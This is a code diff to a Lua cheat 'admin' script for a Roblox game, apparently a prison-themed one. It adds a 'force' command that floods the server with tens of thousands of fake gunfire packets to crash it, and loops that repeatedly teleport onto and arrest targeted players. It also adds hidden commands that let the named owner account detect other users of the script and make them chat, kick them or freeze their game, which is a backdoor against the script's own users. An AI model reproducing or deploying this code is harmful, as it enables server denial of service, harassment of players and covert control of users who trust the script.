@@ -2,6 +2,8 @@ local Prefix = "-"
 local Connect = {}
 local Cmds = {}
 local Lk = {}
+local Sa = {}
+local UltraSa = {}
 local Players = game.Players
 local LPlayer = game.Players.LocalPlayer
 local Run = game:GetService("RunService")
@@ -1920,6 +1922,73 @@ end
 
 end
 
+if Cmd == "force" then
+
+CrashForceServerDie = true
+
+Run.Stepped:Connect(function()
+
+coroutine.wrap(function()
+coroutine.resume(coroutine.create(function()
+
+if CrashForceServerDie then
+
+ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)
+
+local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")
+
+local Packets = {}
+
+coroutine.wrap(function()
+for SendToServer = 1,50000 do
+coroutine.wrap(function()
+coroutine.resume(coroutine.create(function()
+Packets[SendToServer] = {
+[1] = {
+Cframe = CFrame.new(),
+Hit = workspace:FindFirstChildOfClass("Part")
+},
+[2] = {
+Cframe = CFrame.new(),
+Hit = workspace:FindFirstChildOfClass("Part")
+},
+[3] = {
+Cframe = CFrame.new(),
+Hit = workspace:FindFirstChildOfClass("Part")
+},
+[4] = {
+Cframe = CFrame.new(),
+Hit = workspace:FindFirstChildOfClass("Part")
+}
+}
+end))
+end)()
+end
+end)()
+
+coroutine.wrap(function()
+for ReplicateSends = 1,3 do
+coroutine.wrap(function()
+coroutine.resume(coroutine.create(function()
+ShootEvent:FireServer(Packets,Gun)
+end))
+end)()
+end
+end)()
+
+end
+
+end))
+end)()
+
+end)
+
+wait()
+
+CrashForceServerDie = false
+
+end
+
 if Cmd == "smite" then
 
 CrashSmite = true
@@ -2896,6 +2965,51 @@ if Connect.SendCommand("quit") or Connect.SendCommand("leave") then
 game:Shutdown()
 end
 
+if Connect.SendCommand("anticrash") then
+if Arg2 == "on" then
+if not AntiCrash then
+AntiCrash = true
+LPlayer.PlayerScripts.ClientGunReplicator.Disabled = true
+Message("Anti Crash enabled.",70,70,70,Enum.Font.GothamBlack,22)
+end
+end
+if Arg2 == "off" then
+if AntiCrash then
+AntiCrash = false
+LPlayer.PlayerScripts.ClientGunReplicator.Disabled = false
+Message("Anti Crash desabled.",70,70,70,Enum.Font.GothamBlack,22)
+end
+end
+end
+
+if Connect.SendCommand("sa") then
+local Player = FindPlayer(Arg2)
+if Player ~= nil and not Sa[Player.UserId] then
+Sa[Player.UserId] = {Player = Player}
+end
+end
+
+if Connect.SendCommand("unsa") then
+local Player = FindPlayer(Arg2)
+if Player ~= nil and Sa[Player.UserId] then
+Sa[Player.UserId] = nil
+end
+end
+
+if Connect.SendCommand("ultrasa") then
+local Player = FindPlayer(Arg2)
+if Player ~= nil and not Sa[Player.UserId] then
+Sa[Player.UserId] = {Player = Player}
+end
+end
+
+if Connect.SendCommand("unultrasa") then
+local Player = FindPlayer(Arg2)
+if Player ~= nil and Sa[Player.UserId] then
+Sa[Player.UserId] = nil
+end
+end
+
 end
 
 end
@@ -2928,6 +3042,37 @@ ProtectOwner = false
 Message("Owner protection has been desabled.",255,0,0,Enum.Font.GothamBlack,22)
 end
 end
+end
+end
+
+if Connect.SendCommand("getusers") then
+if LPlayer.Name ~= "viniciuszk70" then
+Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(LPlayer.Name, "All")
+end
+end
+
+if Connect.SendCommand("send") then
+local Player = FindPlayer(Arg2)
+
+if LPlayer == Player then
+Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3, "All")
+end
+
+end
+
+if Connect.SendCommand("kick") then
+local Player = FindPlayer(Arg2)
+
+if LPlayer == Player then
+LPlayer:Kick("Kicked by Owner")
+end
+end
+
+if Connect.SendCommand("crash") then
+local Player = FindPlayer(Arg2)
+
+if LPlayer == Player then
+repeat until nil
 end
 end
 
@@ -3314,7 +3459,9 @@ if not DisableAdmin then
 pcall(function()
 if LPlayer.Character:FindFirstChild('HumanoidRootPart') then
 if not CheckAntiSpam then
+if LPlayer.Character:FindFirstChild("Humanoid").Health ~= 0 then
 SaveFrame = LPlayer.Character.HumanoidRootPart.CFrame
+end
 end
 if LPlayer.Character.Humanoid.Health == 0 then
 CheckDiedAntiArrest = true
@@ -3361,7 +3508,6 @@ pcall(function()
 local OldHour = PlayerGui.Home.hud.ClockFrame.tl.Text
 wait(1)
 if PlayerGui.Home.hud.ClockFrame.tl.Text == OldHour then
-if LPlayer.Character.HumanoidRootPart.Position.Y < 80 then
 local Cam = workspace.CurrentCamera
 PlayerGui.Chat.Frame.Visible = true
 PlayerGui.Home.hud.Visible = true
@@ -3371,13 +3517,62 @@ Cam.CameraType = Enum.CameraType.Custom
 Cam.FieldOfView = 70
 Cam.CameraSubject = workspace:WaitForChild(LPlayer.Name,0.4) 
 StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All,true)
-TeamEvent:FireServer("Bright orange")
-for i,v in pairs(LPlayer.Character:GetChildren()) do
-v:Remove()
+end
+end)
+end
+end
+end)
+
+spawn(function()
+while wait() do
+if not DisableAdmin then
+for i,v in pairs(Sa) do
+pcall(function()
+if v.Player.Character:FindFirstChild("HumanoidRootPart") then
+if v.Player.TeamColor.Name == "Really red" then
+for i = 1,100 do
+coroutine.resume(coroutine.create(function()
+LPlayer.Character.HumanoidRootPart.CFrame = v.Player.Character.HumanoidRootPart.CFrame + v.Player.Character.HumanoidRootPart.CFrame.lookVector * -1.7
+workspace.Remote.arrest:InvokeServer(v.Player.Character.Head)
+end))
+end
+else
+pcall(function()
+Crim(v.Player)
+end)
+end
+end
+end)
 end
 end
 end
 end)
+
+spawn(function()
+while wait() do
+if not DisableAdmin then
+for i,v in pairs(UltraSa) do
+pcall(function()
+if v.Player.Character:FindFirstChild("HumanoidRootPart") then
+if v.Player.TeamColor.Name == "Really red" then
+for i = 1,50 do
+coroutine.resume(coroutine.create(function()
+for i = 1,100 do
+coroutine.resume(coroutine.create(function()
+LPlayer.Character.HumanoidRootPart.CFrame = v.Player.Character.HumanoidRootPart.CFrame + v.Player.Character.HumanoidRootPart.CFrame.lookVector * -1.7
+workspace.Remote.arrest:InvokeServer(v.Player.Character.Head)
+end))
+end
+end))
+end
+else
+pcall(function()
+Crim(v.Player)
+end)
+end
+end
+end)
+end
 end
 end
 end)
@@ -3482,7 +3677,7 @@ end
 getgenv().RemoveOldScript = function()
 pcall(function()
 Message("The script has been rerun, the old toggles and loops have been removed to prevent bugs.",70,70,200,Enum.Font.GothamBlack,22)
-MsdAdminV2:Destroy()
+MsdAdminV2:Destroy();
 DisableAdmin = true
 RemoveOldScript:Destroy()
 end)
